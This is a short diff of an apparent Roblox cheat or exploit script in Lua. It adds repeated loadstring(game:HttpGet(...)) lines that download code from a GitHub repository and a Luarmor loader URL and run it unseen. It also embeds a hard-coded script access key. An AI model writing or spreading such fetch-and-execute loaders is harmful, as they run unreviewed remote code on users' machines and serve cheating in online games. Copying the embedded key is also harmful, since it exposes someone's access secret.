@@ -443,7 +443,14 @@ local function HZWNR_fake_script() -- milk.x
 end
 coroutine.wrap(HZWNR_fake_script)()
 
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/1GrayArea"))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/5removelag"))()
+wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/00VPSEdits"))()
-
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/4TptominePlatform"))()
+wait(3)
 script_key="JbYFIGJriMbeFASbQhawWjDxeSczMdFv";
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc715fb43902af268c335a5c7269be5e.lua"))()
